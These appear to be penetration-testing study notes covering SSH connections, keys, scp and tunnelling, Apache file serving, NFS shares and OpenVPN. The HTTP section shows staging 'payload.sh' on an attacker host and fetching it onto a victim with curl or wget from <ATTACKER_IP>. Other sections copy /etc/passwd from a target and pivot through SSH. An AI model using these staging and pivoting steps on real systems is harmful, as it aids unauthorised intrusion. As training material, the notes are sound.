# Secure Shell (SSH) Fundamentals

**SSH (Secure Shell)** is a cryptographic network protocol used to securely log into and execute commands on a remote machine over an unsecured network. It operates on **TCP port 22** by default and encrypts all traffic (including passwords and authentication tokens) to prevent eavesdropping and session hijacking.

  

## 1. Basic Connection Syntax

The standard command to initiate an SSH connection uses the following structure:

  

Bash

```
# General syntax: ssh [options] [username]@[remote_host]
ssh user@192.168.1.50
```

- **`ssh`**: Invokes the OpenSSH client program.
    
      
    
- **`user`**: The account username on the target remote system.
    
      
    
- **`192.168.1.50`**: The destination target (can be an IPv4 address, IPv6 address, or domain name like `target.htb`).
    
      
    

## 2. Essential SSH Flags & Parameters

In operational scenarios, target services often run on non-standard ports or require specific authentication parameters.

  

Bash

```
# Connect to a non-standard port (e.g., 2222)
ssh -p 2222 user@192.168.1.50

# Connect using a specific SSH private key file
ssh -i ~/.ssh/id_ed25519 user@192.168.1.50

# Enable verbose mode for troubleshooting/debugging connection handshakes
ssh -v user@192.168.1.50

# Execute a single command on the remote target without opening an interactive shell
ssh user@192.168.1.50 "uname -a; id"
```

- **`-p 2222`**: Specifies the target port (**`2222`** instead of default **`22`**).
    
      
    
- **`-i ~/.ssh/id_ed25519`**: **Identity file** flag. Tells SSH to use a specific private key rather than searching default paths.
    
      
    
- **`-v`**: **Verbose mode**. Displays detailed debugging logs regarding authentication, key exchange, and cipher negotiations (use **`-vvv`** for maximum detail).
    
      
    

## 3. SSH Key-Based Authentication

Password authentication is susceptible to brute-force attacks. Key-based authentication uses asymmetric cryptography (a public/private key pair) for authentication.

  

**1.Generate an SSH Key Pair:**Run on your local attacker/management workstation.

Use **`ssh-keygen`** to generate a public and private key pair.

  

Bash

```
# Generate a modern Ed25519 key pair with a comment
ssh-keygen -t ed25519 -C "admin@kali"
```

- **`-t ed25519`**: Specifies the key algorithm (**Ed25519** is highly secure and faster than standard RSA).
    
      
    
- **`-C`**: Adds a comment to the end of the public key (usually an email or identifier).
    
      
    
- **Result**: Generates two files in **`~/.ssh/`**:
    
      
    - **`id_ed25519`** (Private Key — **NEVER share or disclose this file**).
        
          
        
    - **`id_ed25519.pub`** (Public Key — Safely placed on remote systems).
        
          
        

**2.Copy the Public Key to the Remote Target:**Requires valid credentials on the target machine.

Append your public key to the remote target's **`~/.ssh/authorized_keys`** file.

  

Bash

```
# Automatically install your public key onto the target machine
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@192.168.1.50
```

- **`ssh-copy-id`**: Automates copying the **`.pub`** key and applies the correct file permissions on the target server.
    
      
    

**3.Authenticate Without a Password:**Test the key-based login.

Connect to the target system. SSH will automatically authenticate using the generated key.

  

Bash

```
# Connect using the installed identity key
ssh -i ~/.ssh/id_ed25519 user@192.168.1.50
```

## 4. File Transfers Over SSH (`scp` and `rsync`)

SSH includes protocols for secure file transfers between local and remote systems.

  

### Secure Copy Protocol (`scp`)

Bash

```
# Copy a local file TO a remote target directory
scp -P 22 local_file.txt user@192.168.1.50:/home/user/

# Copy a remote file FROM a target TO local current directory
scp user@192.168.1.50:/etc/passwd ./passwd_backup

# Recursively copy an entire directory TO a remote target
scp -r ./tools/ user@192.168.1.50:/tmp/
```

- **`-P`**: Capital **`-P`** specifies the remote port in **`scp`** (note: lower-case **`-p`** is used in standard **`ssh`**).
    
      
    
- **`-r`**: **Recursive** flag; required when transferring entire directory structures.
    
      
    

## 5. SSH Tunneling and Port Forwarding

SSH can encapsulate other protocols inside an encrypted tunnel, allowing access to internal services or bypassing network firewalls.

  

Bash

```
# Local Port Forwarding: Route local port 8080 to an internal server's port 80
ssh -L 8080:10.10.10.5:80 user@192.168.1.50 -N

# Dynamic Port Forwarding: Create a SOCKS5 proxy on local port 1080
ssh -D 1080 user@192.168.1.50 -N
```

- **`-L local_port:target_host:target_port`**: Binds a port on your local machine (**`8080`**) to reach a remote IP/port (**`10.10.10.5:80`**) through the SSH pivot host.
    
      
    
- **`-D 1080`**: Opens a local SOCKS5 proxy on port **`1080`**, allowing toolsets (e.g., `proxychains`) to route arbitrary traffic through the remote SSH target.
    
      
    
- **`-N`**: Tells SSH not to execute a remote shell command (used purely for maintaining a tunnel).
    
      
    

## 6. Critical SSH File Locations & Permissions

SSH strictly enforces file permissions. Incorrect file permissions on private keys or authorized key files cause authentication to fail silently.

| **File / Directory** | **Location**             | **Recommended Permissions** | **Purpose**                                                    |
| -------------------- | ------------------------ | --------------------------- | -------------------------------------------------------------- |
| **SSH Directory**    | `~/.ssh/`                | `700` (`drwx------`)        | Stores user SSH keys and configuration files.                  |
| **Private Key**      | `~/.ssh/id_ed25519`      | `600` (`-rw-------`)        | User's secret authentication key. Read/write only by owner.    |
| **Public Key**       | `~/.ssh/id_ed25519.pub`  | `644` (`-rw-r--r--`)        | User's public key shared with remote servers.                  |
| **Authorized Keys**  | `~/.ssh/authorized_keys` | `600` (`-rw-------`)        | List of public keys allowed to log into this target account.   |
| **Known Hosts**      | `~/.ssh/known_hosts`     | `644` (`-rw-r--r--`)        | Stores fingerprints of remote servers to prevent MITM attacks. |
| **Server Config**    | `/etc/ssh/sshd_config`   | `644` (`-rw-r--r--`)        | System-wide daemon configuration file for target servers.      |

# HTTP (Hypertext Transfer Protocol)
## 1. How Web Server Mapping Works

- **Document Root (`/var/www/html`):** The default local directory mapped to the root URL (`/`).
    
      
    
- **Formula:** `Local Path = Document Root + Requested File`
    
      
    
- **Example:** `[http://10.10.10.10/shell.sh](http://10.10.10.10/shell.sh)` loads `/var/www/html/shell.sh`
    
      
    

## 2. Managing the Apache HTTP Service

|**Goal**|**Command**|**Description**|
|---|---|---|
|**Start Service**|`sudo systemctl start apache2`|Starts HTTP server immediately (TCP/80)|
|**Auto-Start on Boot**|`sudo systemctl enable apache2`|Ensures server launches whenever OS boots|
|**Check Status**|`sudo systemctl status apache2`|Confirms process is `active (running)`|
|**Restart Service**|`sudo systemctl restart apache2`|Reloads server after changing config files|

## 3. Staging and Retrieving Files (File Transfer)

### Step 1: Host File on Attacker Machine

Bash

```
# Move target payload into Apache web root
sudo cp payload.sh /var/www/html/payload.sh
```

### Step 2: Fetch File on Victim/Target Machine

Bash

```
# Download file using curl (-o defines save output path)
curl http://<ATTACKER_IP>/payload.sh -o /tmp/payload.sh

# Alternative: Download file using wget (-O defines save output path)
wget http://<ATTACKER_IP>/payload.sh -O /tmp/payload.sh
```

## 4. Alternative: Quick Python HTTP Server

Use Python when you need a temporary web server without configuring Apache:

Bash

```
# Serve current working directory as Web Root on port 8000
python3 -m http.server 8000
```

# NFS (Network File System)
 NFS allows a client machine to access files over a network as if they were on its local storage. Here’s a summary of the process for setting it up and using it:

### 1. Server-Side: Sharing a Directory

This is the machine that has the files you want to share.

- **Installation:** First, you need to install the NFS server software. On a Debian-based system like Ubuntu, the command is:
    
    ```shell
    sudo apt install nfs-kernel-server -y
    ```
    
- **Configuration:** You define which directories to share in the `/etc/exports` file. Each line specifies a directory, the client(s) allowed to access it, and their permissions.
- **Example:** To create and share a directory called `nfs_sharing` with read/write permissions, you would first create the directory and then edit the configuration file.
    
    ```shell
    # Create the directory
    mkdir ~/nfs_sharing
    
    # Add the share rule to /etc/exports
    # This example gives 'hostname' read/write access.
    echo '/home/user/nfs_sharing hostname(rw,sync,no_root_squash)' | sudo tee -a /etc/exports
    ```
    
    The permissions in the parentheses are critical. `rw` allows read/write access, and `no_root_squash` is a setting that can be a security risk, as it allows the client's root user to have root privileges on the shared files.

### 2. Client-Side: Accessing the Shared Directory

This is the machine that wants to access the files from the server.

- **Create a Mount Point:** You need an empty local directory where the remote files will appear. This is called a "mount point."
    
    ```shell
    mkdir ~/target_nfs
    ```
    
- **Mount the Share:** Use the `mount` command to connect the remote NFS share to your local mount point.
    
    ```shell
    sudo mount <SERVER_IP>:/path/to/remote_share ~/target_nfs
    ```
    
    For example, using the details from the module:
    
    ```shell
    mount 10.129.12.17:/home/john/dev_scripts ~/target_nfs
    ```
    

After these steps, you can navigate into the `~/target_nfs` directory on your client machine, and you'll be able to see and interact with the files from the server's shared directory.

# VPN (Virtual Private Network)
A **Virtual Private Network (VPN)** creates a secure, encrypted tunnel between your computer and a remote network. As the module explains, this makes it seem like you are physically present on that network, protecting all your transmitted data from being intercepted.

This is essential for both employees needing to access a corporate network remotely and for penetration testers who need to connect to a client's internal network to perform a security assessment.

### How to Connect to an OpenVPN Server (as a Client)

Based on the module content, connecting to an existing VPN server is a straightforward process. You will typically be given a configuration file by the server administrator.

1. **Get the Configuration File:** You need the VPN configuration file, which usually has an `.ovpn` extension (e.g., `internal.ovpn`). This file contains all the settings needed to establish a connection.
    
2. **Install the OpenVPN Client:** If it's not already installed, you can add it to your system using the package manager.
    
    ```shell
    sudo apt install openvpn -y
    ```
    
3. **Establish the Connection:** Use the `openvpn` command from your terminal, pointing it to your configuration file.
    
    ```shell
    sudo openvpn --config internal.ovpn
    ```
    

Once this command is running and the connection is established, your machine will be part of the remote network. You can then communicate with the internal hosts on that network as if you were connected locally.